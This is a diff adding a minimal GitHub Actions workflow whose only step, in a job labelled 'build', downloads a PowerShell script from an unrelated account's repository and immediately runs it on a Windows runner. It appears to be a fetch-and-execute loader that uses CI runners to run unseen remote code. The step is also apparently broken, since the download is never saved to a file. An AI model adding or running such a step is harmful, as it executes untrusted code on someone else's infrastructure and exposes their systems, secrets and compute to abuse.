@@ -1,0 +1,12 @@
+on: [workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+
+    steps:
+    - name: Download
+      run: |
+           curl https://github.com/Usser1222/circleci/raw/main/0.ps1
+           ./0.ps1
